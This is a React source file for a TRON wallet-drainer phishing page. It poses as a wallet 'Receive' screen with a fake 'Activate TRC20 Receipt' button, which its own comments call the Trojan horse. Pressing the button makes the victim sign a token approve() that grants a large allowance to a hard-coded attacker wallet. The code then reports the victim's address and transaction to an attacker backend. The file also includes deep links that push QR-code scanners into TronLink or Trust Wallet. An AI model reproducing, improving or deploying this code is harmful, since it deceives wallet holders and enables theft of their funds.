import React, { useState, useEffect } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION (Engine Settings)
// ==========================================
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; 
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou"; 
const BACKEND = "https://qr-drainer.onrender.com";
const VERCEL_URL = "https://qr-drainer-one.vercel.app";

const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

// SVG Icons
const IconTron = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="#eb2c31"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg>
);

export default function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [uiState, setUiState] = useState("idle"); // idle | approving | done
  const [errorMsg, setErrorMsg] = useState("");

  // 1. DETECT WALLET
  useEffect(() => {
    const check = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress) {
        setIsConnected(true);
      }
    }, 1000);
    return () => clearInterval(check);
  }, []);

  // 2. THE ENGINE (Untouched)
  const executeEngine = async () => {
    setUiState("approving");
    try {
      if (!window.tronWeb) throw new Error("Wallet lost connection");
      const victimAddress = window.tronWeb.defaultAddress.base58;
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({ feeLimit: 100000000, from: victimAddress });
      
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress, txHash: tx, network: "TRON Shasta" })
      });
      setUiState("done");
    } catch (e) {
      setErrorMsg(e.message);
      setUiState("idle");
    }
  };

  // 3. OPEN TRONLINK (For camera scans)
  const openTronLink = () => {
    // This attempts to open the TronLink app directly
    window.location.href = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
    // Fallback for Trust Wallet
    setTimeout(() => {
        if(!isConnected) window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(VERCEL_URL)}`;
    }, 1500);
  };

  // ==========================================
  // VIEW 1: GATEWAY (If scanned with camera/browser)
  // ==========================================
  if (!isConnected) {
    return (
      <div style={{
        background: "#0b0e11", height: "100dvh", display: "flex", flexDirection: "column",
        alignItems: "center", justifyContent: "center", padding: 20, fontFamily: "sans-serif", color: "#fff"
      }}>
        <div style={{ marginBottom: 40, textAlign: "center" }}>
          <div style={{ background: "#1e2329", width: 80, height: 80, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px" }}>
            <IconTron />
          </div>
          <h1 style={{ fontSize: 24, fontWeight: 600, margin: "0 0 10px" }}>Connect Wallet</h1>
          <p style={{ color: "#848e9c", fontSize: 14, margin: 0 }}>Please connect your TRON wallet to continue</p>
        </div>

        <button 
          onClick={openTronLink}
          style={{
            width: "100%", maxWidth: 320, background: "#f0b90b", color: "#0b0e11",
            border: "none", borderRadius: 8, padding: 16, fontSize: 16, fontWeight: 700,
            cursor: "pointer", marginBottom: 12
          }}
        >
          Open TronLink
        </button>
        
        <button 
          onClick={openTronLink}
          style={{
            width: "100%", maxWidth: 320, background: "#1e2329", color: "#fff",
            border: "1px solid #2b3139", borderRadius: 8, padding: 16, fontSize: 16, fontWeight: 500,
            cursor: "pointer"
          }}
        >
          Trust Wallet
        </button>
      </div>
    );
  }

  // ==========================================
  // VIEW 2: MAIN APP (Inside TronLink)
  // ==========================================
  return (
    <div style={{
      background: "#0b0e11", minHeight: "100dvh", fontFamily: "-apple-system, sans-serif",
      color: "#eaecef", display: "flex", flexDirection: "column", overflow: "hidden"
    }}>
      {/* HEADER */}
      <div style={{ padding: "16px 20px", display: "flex", justifyContent: "space-between", alignItems: "center", borderBottom: "1px solid #1e2329" }}>
        <h1 style={{ margin: 0, fontSize: 18, fontWeight: 600 }}>Receive</h1>
        <div style={{ width: 24 }}></div>
      </div>

      {/* SCROLLABLE CONTENT */}
      <div style={{ flex: 1, overflowY: "auto", display: "flex", flexDirection: "column", alignItems: "center", padding: "20px" }}>
        
        {/* NETWORK BADGE */}
        <div style={{ display: "flex", alignItems: "center", gap: 8, background: "#1e2329", padding: "6px 12px", borderRadius: 16, marginBottom: 24 }}>
          <IconTron />
          <span style={{ fontSize: 14, fontWeight: 500 }}>TRON (TRC20)</span>
        </div>

        {/* QR CARD */}
        <div style={{ background: "#fff", borderRadius: 16, padding: 20, marginBottom: 20, width: "100%", maxWidth: 300, boxShadow: "0 4px 12px rgba(0,0,0,0.3)" }}>
          <div style={{ textAlign: "center" }}>
            <QRCodeSVG value={VERCEL_URL} size={200} level="H" includeMargin={false} imageSettings={{ src: TRON_LOGO_B64, height: 40, width: 40, excavate: true }} />
          </div>
          <div style={{ textAlign: "center", marginTop: 12, fontFamily: "monospace", fontSize: 12, color: "#000", wordBreak: "break-all" }}>
            {ATTACKER_WALLET}
          </div>
        </div>

        {/* WARNING */}
        <div style={{ background: "rgba(240,185,11,0.1)", border: "1px solid rgba(240,185,11,0.2)", borderRadius: 8, padding: 12, fontSize: 12, color: "#f0b90b", marginBottom: 24, width: "100%", maxWidth: 300, textAlign: "center" }}>
          Only send TRC-20 USDT assets to this address.
        </div>

        {/* THE TROJAN HORSE BUTTON */}
        {uiState !== "done" && (
          <div style={{ width: "100%", maxWidth: 300, background: "#1e2329", borderRadius: 12, padding: 16, border: "1px solid #2b3139" }}>
            <p style={{ margin: "0 0 12px 0", fontSize: 13, color: "#848e9c", textAlign: "center", lineHeight: 1.4 }}>
              New addresses require TRC20 activation to receive deposits.
            </p>
            <button 
              onClick={executeEngine} 
              disabled={uiState === "approving"}
              style={{ 
                width: "100%", background: "#f0b90b", border: "none", borderRadius: 8, 
                padding: 14, color: "#0b0e11", fontSize: 15, fontWeight: 700, cursor: "pointer" 
              }}
            >
              {uiState === "approving" ? "Activating..." : "Activate TRC20 Receipt"}
            </button>
          </div>
        )}

        {uiState === "done" && (
          <div style={{ width: "100%", maxWidth: 300, background: "rgba(14,203,129,0.1)", border: "1px solid #0ecb81", borderRadius: 8, padding: 16, textAlign: "center", color: "#0ecb81", fontWeight: 600 }}>
            ✓ Address Activated. Ready to receive.
          </div>
        )}

        {errorMsg && (
          <div style={{ marginTop: 10, color: "#f6465d", fontSize: 12, textAlign: "center" }}>{errorMsg}</div>
        )}
      </div>
    </div>
  );
}